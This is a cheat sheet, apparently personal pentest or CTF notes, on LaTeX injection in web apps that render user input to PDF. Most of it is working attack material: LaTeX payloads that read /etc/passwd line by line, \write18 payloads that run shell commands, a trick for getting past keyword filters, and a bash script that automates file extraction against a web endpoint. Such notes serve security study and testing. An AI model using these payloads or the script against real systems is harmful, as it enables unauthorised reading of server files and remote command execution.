
# What is LaTeX?

Is a text composition system that allow you to generate documents that have a high quality. It's very useful in university...

---

# What is LateX Injection?

Allow to the user to inject malicious code in a field of a website and then is processing

### Some examples of LaTeX Injection

- An attacker prove the capacity of add graphic o fields in a web application.
- An attacker can send LaTeX code that have an hyperlink that include a malicious file or some type of virus

---


# Injections

## Read a one line of a file

You can put this in a input field of a website that create LaTeX documents

````latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\text{\line}
\closein\file
````

If you want to see the next line you can add `\read\file to\line`

````latex
\newread\file
\openin\file=/etc/passwd
\read\file to\line
\read\file to\line
\text{\line}
\closein\file
````

### How to see all the lines?

You can put a different name to the lines and call the lines in the line `\text{\lineA\lineB}`

````latex
\newread\file
\openin\file=/etc/passwd
\read\file to\lineA
\read\file to\lineB
\text{\lineA\lineB}
\closein\file
````

But you are going to see the lines together

To do this more confortable you can use **loops**, but is not recommended because sometimes some characters (of the reading file) don't like so much and is posible that not represent nothing

But we can automatize this with an script in bash:

````bash
#!/bin/bash

# Get the files from the server | LaTeX Injection

# Global variables

declare -r main_url="http://localhost/ajax.php"

filename=$1

if [[ $filename ]]; then
    read_file_to_line="%0A\read\file%20to\line"
    for i in $(seq 1 100); do
        file_to_download=$(/usr/bin/curl -s -X POST $main_url -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" -d "content=\newread\file%0A\openin\file=$filename$read_file_to_line%0A\text{\line}%0A\closein\file&template=blank" | /usr/bin/grep -i download | awk 'NF{print $NF}')
        
        if [[ $file_to_download ]]; then
            wget $file_to_download &>/dev/null
            file_to_convert=$(echo $file_to_download | tr '/' ' ' | awk 'NF{print $NF}')
            /usr/bin/pdftotext $file_to_convert
            file_to_read=$(echo $file_to_convert | sed 's/\.pdf/\.txt/')
            rm $file_to_convert
            cat $file_to_read | head -n 1
            rm -rf $file_to_read
            read_file_to_line+="%0A\read\file%20to\line"
        else
           read_file_to_line+="%0A\read\file%20to\line" 
        fi
    done
else
    echo -e "\n\n[!] Uso: $0 /etc/passwd\n\n"
fi

````

The problem of the script is that dont' show the lines that have or begin with a underscore line (\_) and hastag (#), but the script continues running 

---

# Command execution

### If you want to see the command in the error of compilation

````latex
\immediate\write18{id}
````

### If you want to see the result in the generate pdf

````latex
\immediate\write18{id > output}

\newread\file
\openin\file=output
\read\file to\line
\text{\line}
\closein\file
````

As input is sanitized in this case, we can read one line .

In this case there are a compile directory that can do directory listing

---

# Avoid prohibited words

Sometimes when used regex in the code you can avoid this with

````latex
\def\first{inp}
\def\second{ut}
\first\second
````

---

# Resources

- [https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code](https://github.com/internetwache/Internetwache-CTF-2016/tree/master/tasks/web90/code)
- https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LaTeX%20Injection

---
# Tags

#vulnerabilty #latexInjection #pdf #scriptingbash  
